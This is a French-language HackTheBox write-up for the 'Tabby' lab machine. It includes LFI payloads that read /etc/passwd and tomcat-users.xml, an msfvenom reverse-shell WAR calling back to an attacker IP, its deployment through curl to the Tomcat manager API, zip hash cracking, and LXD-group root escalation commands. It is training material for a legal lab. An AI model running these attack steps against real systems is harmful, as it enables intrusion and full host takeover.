---
title: HTB | Tabby
description: Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a second website that is hosted on the same server under a different vhost. This website is vulnerable to Local File Inclusion. Knowledge of the OS version is used to identify the tomcat-users.xml file location. This file yields credentials for a Tomcat user that is authorized to use the /manager/text interface. This is leveraged to deploy of a war file and upload a webshell, which in turn is used to get a reverse shell. Enumeration of the filesystem reveals a password protected zip file, which can be downloaded and cracked locally. The cracked password can be used to login to the remote machine as a low privileged user. However this user is a member of the LXD group, which allows privilege escalation by creating a privileged container, into which the host&amp;amp;amp;#039;s filesystem is mounted. Eventually, access to the remote machine is gained as root using SSH.
slug: tabby-htb
date: 2025-05-05 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Tabby cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Tabby</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.194</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## System Info
```bash
Ubuntu
```

## Users
```bash
tomcat : $3cureP4s5w0rd123!
ash : admin@it
```

## Enumeration

### nmap
```bash
$ nmap -sC -sV -p- -An -T4 10.10.10.194
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
```

## Foothold

### Apache Tomcat - LFI
```bash
http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd

<<------------>>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

### Tomcat Credentials using LFI
En utilisant la LFI sur le site web port 80, on peut retrouver les creds pour le serveur apache tomcat présent sur le port 8080:
```bash
GET /news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1

-------------------------
...
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

### Upload War file
On comprend que le role manager-script nous permet d'utiliser l'API tomcat pour pouvoir upload un shell. Habituellement on aurait plus utiliser la GUI pour le faire, mais il nous manquer le role manager-gui ! On peut tout de meme le faire donc avec manager-script mais uniquement avec l'API, ce qu'on fait ici avec un curl :
```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Tabby (main*) » msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o shell.war 
Payload size: 13027 bytes
Final size of war file: 13027 bytes
Saved as: shell.war

~/github/Hacking/HackTheBox/Machines/Linux/Easy/Tabby (main*) » curl -X PUT -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/shell&update=true'
OK - Deployed application at context path [/shell]

---------------------------

~ » nc -lnvp 1337                        
listening on [any] 1337 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.194] 46720
whoami
tomcat
```

### Ash backup file - user flag
```bash
» cat linpeas.out | grep ash | tail
...
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip <--------- HERE
...
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1081/etc/skel/.bash_logout
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw-r--r-- 1 tomcat tomcat 220 Feb 25  2020 /opt/tomcat/.bash_logout

# Sur kali
$ zip2john 16162020_backup.zip > hash.txt

$ john --format=PKZIP hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:01 DONE (2025-05-05 19:03) 0.9615g/s 9972Kp/s 9972Kc/s 9972KC/s adzlogan..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
On peut utiliser ce mot de passe pour elever nos privilèges vers l'utilisateur **ash**:
```bash
tomcat@tabby:/home$ 
tomcat@tabby:/home$ su ash
Password: admin@it
ash@tabby:/home$ whoami
ash
ash@tabby:/home$ cd ash/
ash@tabby:~$ cat user.txt 
fb78.....79f6
```

### Ash - SSH connexion
```bash
ash@tabby:~/.ssh$ ssh-keygen
...
ash@tabby:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

----------------------

» ssh ash@10.10.10.194 -i ash.key # <-- avec la clé privée
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)

.....
Last login: Tue May 19 11:48:00 2020
ash@tabby:~$ 
```

## Privilege Escalation

### Enumeration
On remarque de ash fait parti du groupe lxd et que lxd tourne sur la machine. ChatGPT m'a indiqué la possibilité d'une exploit avec lxd.
```bash
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root       81608  0.0  0.0   2488   588 ?        S    17:18   0:00  _ bpfilter_umh
root           1  0.0  0.5 104124 11460 ?        Ss   11:11   0:01 /sbin/init maybe-ubiquity
root         510  0.0  1.8  92596 37716 ?        S<s  11:11   0:03 /lib/systemd/systemd-journald
root         537  0.0  0.2  21748  5884 ?        Ss   11:11   0:00 /lib/systemd/systemd-udevd
root         677  0.0  0.9 411432 18380 ?        SLsl 11:11   0:05 /sbin/multipathd -d -s
systemd+     711  0.0  0.6  24312 13280 ?        Ss   11:11   0:01 /lib/systemd/systemd-resolved
systemd+     712  0.0  0.3  90388  6392 ?        Ssl  11:11   0:01 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         722  0.0  0.5  47524 10376 ?        Ss   11:11   0:00 /usr/bin/VGAuthService
root         723  0.0  0.3 162004  7860 ?        S<sl 11:11   0:12 /usr/bin/vmtoolsd
root         847  0.0  0.3 235548  7296 ?        Ssl  11:11   0:00 /usr/lib/accountsservice/accounts-daemon
message+     848  0.0  0.2   7512  4604 ?        Ss   11:11   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         854  0.0  0.1  81944  3748 ?        Ssl  11:11   0:00 /usr/sbin/irqbalance --foreground
syslog       856  0.0  0.2 224324  5344 ?        Ssl  11:11   0:00 /usr/sbin/rsyslogd -n -iNONE
root         857  0.0  1.6 926232 33124 ?        Ssl  11:11   0:02 /usr/lib/snapd/snapd
root         858  0.0  0.3  16864  7808 ?        Ss   11:11   0:00 /lib/systemd/systemd-logind
root         895  0.0  0.1   6812  2992 ?        Ss   11:11   0:00 /usr/sbin/cron -f
daemon[0m       934  0.0  0.1   3792  2280 ?        Ss   11:11   0:00 /usr/sbin/atd -f
ash        78178  0.0  0.2  13896  5412 ?        S    17:15   0:00      _ sshd: ash@pts/2
ash        78181  0.0  0.2   8544  5464 pts/2    Ss+  17:15   0:00          _ -bash
ash        78265  0.0  0.5  24760 11216 pts/2    S    17:18   0:00              _ curl http://10.10.14.21/linpeas.sh
ash        78266  0.6  0.2   9260  5984 pts/2    S    17:18   0:00              _ bash
ash        81771  0.0  0.1   9260  4068 pts/2    S    17:18   0:00                  _ bash
ash        81775  0.0  0.1   9208  3636 pts/2    R    17:18   0:00                  |   _ ps fauxwww
ash        81773  0.0  0.1   9260  2776 pts/2    R    17:18   0:00                  _ bash
ash        81774  0.0  0.1   9260  2776 pts/2    S    17:18   0:00                  _ bash
root         956  0.0  0.0   5828  1852 tty1     Ss+  11:11   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
tomcat       960  0.1  8.6 3094604 175680 ?      Ssl  11:11   0:38 /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/var/lib/tomcat9/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/share/tomcat9/bin/bootstrap.jar:/usr/share/tomcat9/bin/tomcat-juli.jar -Dcatalina.base=/var/lib/tomcat9 -Dcatalina.home=/usr/share/tomcat9 -Djava.io.tmpdir=/tmp org.apache.catalina.startup.Bootstrap start
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat      1399  0.0  0.0   2608   600 ?        S    11:17   0:00  _ /bin/sh
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat      1419  0.0  0.4  15968 10104 ?        S    11:18   0:00  |   _ python3 -c import pty;pty.spawn("/bin/bash")
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat      1420  0.0  0.2   8568  5608 pts/0    Ss+  11:18   0:00  |       _ /bin/bash
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat     77260  0.0  0.0   2608   608 ?        S    16:55   0:00  _ /bin/sh
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat     77273  0.0  0.4  15708  9796 ?        S    16:55   0:00      _ python3 -c import pty;pty.spawn('/bin/bash')
  └─(Caps) 0x0000000000000400=cap_net_bind_service
tomcat     77274  0.0  0.2   8436  5452 pts/1    Ss   16:55   0:00          _ /bin/bash
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root       77714  0.0  0.2   8776  4196 pts/1    S    17:07   0:00              _ su ash
ash        77738  0.0  0.2   8312  5352 pts/1    S+   17:07   0:00                  _ bash
root         973  0.0  0.8 193420 17916 ?        Ss   11:11   0:00 /usr/sbin/apache2 -k start
www-data     990  0.0  0.4 193888  9792 ?        S    11:11   0:00  _ /usr/sbin/apache2 -k start
www-data     993  0.0  0.4 193872  9776 ?        S    11:11   0:00  _ /usr/sbin/apache2 -k start
www-data    1252  0.0  0.6 193872 12308 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data    1254  0.0  0.6 193888 13444 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data    1255  0.0  0.4 193864  9740 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data    1256  0.0  0.4 193872  9764 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data    1257  0.0  0.4 193888  9788 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data    1258  0.0  0.4 193888  9776 ?        S    11:12   0:00  _ /usr/sbin/apache2 -k start
www-data   35324  0.0  0.4 193856  9632 ?        S    11:39   0:00  _ /usr/sbin/apache2 -k start
www-data   35326  0.0  0.3 193824  7816 ?        S    11:39   0:00  _ /usr/sbin/apache2 -k start
root         983  0.0  0.3 232700  6908 ?        Ssl  11:11   0:00 /usr/lib/policykit-1/polkitd --no-debug
ash        77728  0.0  0.4  18672 10004 ?        Ss   17:07   0:00 /lib/systemd/systemd --user
ash        77732  0.0  0.1 105464  3480 ?        S    17:07   0:00  _ (sd-pam)
ash        81372  0.0  0.1   7084  3992 ?        Ss   17:18   0:00  _ /usr/bin/dbus-daemon[0m --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       81391  0.3  0.0   2616  1936 ?        Ss   17:18   0:00 /bin/sh /snap/lxd/21468/commands/daemon.start
root       81570  1.1  2.6 1458640 53604 ?       Sl   17:18   0:00  _ lxd --logfile /var/snap/lxd/common/lxd/logs/lxd.log --group lxd
root       81557  0.0  0.0  85608  2016 ?        Sl   17:18   0:00 lxcfs /var/snap/lxd/common/var/lib/lxcfs -p /var/snap/lxd/common/lxcfs.pid


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 77714 with ppid 77274 is run by user root but the ppid user is tomcat

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information


ash@tabby:~$ groups ash
ash : ash adm cdrom dip plugdev lxd
```

### lxd group privilege escalation - root flag
On trouve un tutoriel pour exploiter lxd :
https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63
Ainsi qu'un github avec le container à cloner sur la machine :
https://github.com/saghul/lxd-alpine-builder
```bash
ash@tabby:~$ cd lxd-alpine-builder/
ash@tabby:~/lxd-alpine-builder$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz
ash@tabby:~/lxd-alpine-builder$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
ash@tabby:~/lxd-alpine-builder$ lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | May 5, 2025 at 5:29pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
ash@tabby:~/lxd-alpine-builder$ lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
ash@tabby:~/lxd-alpine-builder$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

ash@tabby:~/lxd-alpine-builder$ lxc init myimage ignite -c security.privileged=true
Creating ignite
ash@tabby:~/lxd-alpine-builder$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
ash@tabby:~/lxd-alpine-builder$ lxc start ignite
ash@tabby:~/lxd-alpine-builder$ lxc exec ignite /bin/sh
~ # cd /mnt/root/
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
/mnt/root # cd root
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat root.txt 
47a3.....74a4
```

## Tips
- J'aurais dû mieux comprendre les roles et leur fonctionnement. Le role **manager-script** permet uniquement d'utiliser l'API de tomcat. J'aurais dû axé mes recherches sur les droits hérités de ce rôle pour mieux comprendre comment upload un reverse shell.